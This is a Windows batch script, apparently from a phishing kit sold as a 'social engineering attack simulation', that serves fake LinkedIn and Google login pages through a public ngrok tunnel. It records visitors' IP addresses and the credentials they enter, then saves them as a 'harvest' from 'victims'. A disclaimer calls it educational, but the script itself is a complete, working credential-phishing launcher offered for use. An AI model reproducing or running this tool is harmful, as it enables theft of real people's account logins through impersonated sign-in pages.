@echo off

cls
del ext.bat >nul 2>&1
set ver=v1.1.6
title Social engineering attack simulation %ver%

set php="%CD%\php\php.exe"
set ngrok="%CD%\ngrok.exe"
set jq="%CD%\jq.exe"

:main
	call :checkbin
	echo. & echo. & echo.
	call :banner
	cls
	call :authngrok
	:dowhile1
		cls
		call :menu
		set m=%errorlevel%
		if "%m%"=="1" exit /b 0
	if 1==1 goto dowhile1
	:end1
exit /b 0

:checkbin

	if not exist %php% (
		mkdir %php%\.. >nul 2>&1
		echo.
		echo Downloading php
		echo.
		if %PROCESSOR_ARCHITECTURE%==AMD64 curl -k -LJ https://windows.php.net/downloads/releases/archives/php-8.0.9-nts-Win32-vs16-x64.zip -o %php%.zip
		if %PROCESSOR_ARCHITECTURE%==x86 curl -k -LJ https://windows.php.net/downloads/releases/archives/php-8.0.9-nts-Win32-vs16-x86.zip -o %php%.zip

		7za.exe x -y -o%php%\.. %php%.zip
		del %php%.zip
	)
	echo.
	echo.
	if exist %php% %php% -v

	if not exist %ngrok% (
		mkdir %ngrok%\.. >nul 2>&1
		echo.
		echo Downloading ngrok
		echo.
		if %PROCESSOR_ARCHITECTURE%==AMD64 curl -k -LJ https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip -o %ngrok%.zip
		if %PROCESSOR_ARCHITECTURE%==x86 curl -k -LJ https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-386.zip -o %ngrok%.zip

		7za.exe x -y -o%ngrok%\.. %ngrok%.zip
		del %ngrok%.zip
	)
	echo.
	if exist %ngrok% %ngrok% -v

	if not exist %jq% (
		echo.
		echo Downloading jq
		echo.
		if %PROCESSOR_ARCHITECTURE%==AMD64 curl -k -LJ https://github.com/stedolan/jq/releases/latest/download/jq-win64.exe -o %jq%
		if %PROCESSOR_ARCHITECTURE%==x86 curl -k -LJ https://github.com/stedolan/jq/releases/latest/download/jq-win32.exe -o %jq%
	)
	echo.
	if exist %jq% %jq% --version

exit /b 0

:authngrok
	setlocal enableextensions enabledelayedexpansion
	if not exist %userprofile%\.ngrok2\ngrok.yml (
	echo.
	echo Authenticate ngrok! READ CAREFULLY:
	echo.
	echo This will open ngrok website. Login or Create a free account.
	echo Then you will find your authtoken there. Copy that authtoken.
	echo Press Enter if you are ready.
	pause >nul
	echo.

	start "" https://dashboard.ngrok.com/get-started/your-authtoken

	set /p authtoken="Paste or Enter your ngrok authtoken: "
	%ngrok% authtoken !authtoken!
	)
	endlocal
exit /b 0

rem Option Menu
:menu
	echo.
	echo 				Social Engineering Attack Simulation Tool
	echo.
	echo
	echo. & echo.
	echo 		[01] LinkedIn
	echo 		[02] Google	
	echo		Press Enter to Exit

	echo. & echo.
	set "sel="
	set /p "sel=Enter your choice (Enter to Exit): "
		       if "%sel%"=="01" ( set server=LinkedIn
		) else if "%sel%"=="02" ( set server=Google
		) else if "%sel%"=="38" ( set /p server="Enter full path to directory containing index file of your custom page: "
		) else if "%sel%"=="39" (
			echo.
			echo 					Not available yet!
			echo 		Will be available in version 2.0.0 and later. Current version is %ver%.
			echo.
			call :update
			exit /b 0
		) else if "%sel%"=="40" (
			call :update
			exit /b 0
		) else if "%sel%"=="" ( exit /b 1
		) else ( echo Wrong Choice! Try Again
			timeout /t 2 >nul
			exit /b 0 )
	call :exec
exit /b 0

:update
	echo.
	echo Check for updates ^(y/n^)^?
	choice /cs /c yYnN >nul
	set u=%errorlevel%
	set res=0
	if %u%==1 set res=1
	if %u%==2 set res=1
	if %res%==1 (call :cdownload)
exit /b 0

:checkdirectory
	if "%~dp0"=="%CD%\" exit /b 0
	echo 	Your Currect Directory is %CD%. Changing directory to "%~dp0", location of "%~n0"
	echo 	Use popd command to return to previous directory.
	Pushd "%~dp0"
	echo.
	echo Press Enter to Continue.
	pause >nul 2>&1
	cls
exit /b 0

:checkfiles
	call :checkdirectory

	set serv=1
	if not exist "sites\%server%\index.php" ( set serv=0
		echo index.php
	)
	if not exist "sites\%server%\login.html" (
		if not exist "sites\%server%\index.html" ( set serv=0
			echo index.html or login.html
		)
	)
	if not exist "sites\%server%\ip.php" ( set serv=0
		echo ip.php
	)
	
	if "%serv%"=="0" ( echo.
	echo "%server%" error! The above mentioned files are missing from "%CD%\sites\%server%". If you did not move any files, please report this error.
	echo Open GitHub to report issue ^(y/n^)^?
	choice /cs /c yYnN >nul
	set c=%ERRORLEVEL%
	set res=0
	if "%c%"=="1" set res=1
	if "%c%"=="2" set res=1
	exit /b 1
	)

exit /b 0

:stop
	taskkill /f /im php.exe >nul 2>&1
	taskkill /f /im ngrok.exe >nul 2>&1
exit /b 0

:banner
	echo.
	echo 					    DISCLAIMER
	echo 		 Phishing is illegal. Usage of any hacking tools for hacking targets
	echo 		  without prior mutual written consent is illegal and punishable by
	echo 		 law. This has been developed just for the education purpose and create awareness.
	echo. & echo.
	echo Press any key to Continue only if you AGREE to the above DISCLAIMER.
	pause >nul
exit /b 0

:save
	call :refresh
	call :stop
	mkdir results >nul 2>&1
	mkdir "results\%server%\" >nul 2>nul
	more "sites\%server%\ip.txt" >> "results\%server%\ip.txt"
	more "sites\%server%\usernames.txt" >> "results\%server%\usernames.txt"
	del /f "sites\%server%\usernames.txt" >nul 2>&1
	del /f "sites\%server%\ip.txt" >nul 2>&1
	echo.
	echo Harvest Saved in "%CD%\results\%server%\usernames.txt"
	echo.
	echo Press any key to Continue...
	pause >nul
exit /b 0

:refresh
	setlocal enableextensions enabledelayedexpansion
	set /a count=0
	for /f "tokens=* delims=IP" %%p in ('findstr /c:"IP:" "sites\%server%\ip.txt"') do (
		set /a count+=1
	)
	endlocal && set total=%count%
	cls
	echo Phishing page link: %link%
	echo. & echo. & echo.
	echo					The following %total% victim(s) opened the %server% Phishing link:
	echo.
	more "sites\%server%\ip.txt"

	setlocal enableextensions enabledelayedexpansion
	set /a count=0
	for /f "tokens=* delims=IP" %%p in ('findstr /c:"IP:" "sites\%server%\usernames.txt"') do (
		set /a count+=1
	)
	endlocal && set total=%count%
	echo. & echo. & echo.
	echo						   Credential Harvest from %total% victim(s):
	echo.
	more "sites\%server%\usernames.txt"
	echo. & echo.
exit /b 0

:harvestcredentials
	call :refresh
	echo Press S to stop %server% server and save the Harvest...
	choice /t 5 /c RS /D R /N >nul 2>&1
	set h=%ERRORLEVEL%
	if "%h%"=="1" timeout /t 5 >nul 2>&1
	if "%h%"=="1" goto :harvestcredentials
	call :save
exit /b 0

:getcredentials
	echo. & echo.
	echo						      Waiting for victim(s) to login...
	:dowhile2
		if exist "sites\%server%\usernames.txt" (
			call :harvestcredentials
			exit /b 0
		)
		timeout /t 5 >nul 2>&1
	goto dowhile2
	:end2
exit /b 0

:catchip
	setlocal enableextensions enabledelayedexpansion
	set /a count=0
	for /f "tokens=* delims=IP" %%p in ('findstr /c:"IP:" "sites\%server%\ip.txt"') do (
		set /a count+=1
	)
	endlocal && set total=%count%
	cls
	echo Phishing page link: %link%
	echo. & echo. & echo.
	echo					The following %total% victim(s) opened the %server% Phishing link:
	echo.
	more "sites\%server%\ip.txt"
	call :getcredentials
exit /b 0

:checkfound
	cls
	echo Phishing page link: %link%
	echo. & echo. & echo.
	echo					  Waiting for Victim(s) to open the %server% Phishing link...
	:dowhile3
		if exist "sites\%server%\ip.txt" (
			call :catchip
			exit /b 0
		)
		timeout /t 5 >nul 2>&1
	goto dowhile3
	:end3
exit /b 0

:exec
	call :stop             rem To stop php and ngrok if running
	del /f "sites\%server%\usernames.txt" >nul 2>&1
	del /f "sites\%server%\ip.txt" >nul 2>&1

	start /b "" %php% -S localhost:80 -t "sites\%server%\" >nul 2>&1
	start /b "" %ngrok% http 80 >nul 2>&1

	cls
	echo Phishing page link: Generating! You will be redirected to the ngrok tunnels page. Please Wait...
	echo. & echo. & echo.
	echo							Starting %server% Server...
	echo.
	timeout /t 5 /nobreak >nul
	for /f %%l in ('curl -k --silent http://127.0.0.1:4040/api/tunnels ^| %jq% .tunnels[1].public_url') do set link=%%l
	start "" http://localhost:4040
	call :checkfound
exit /b 0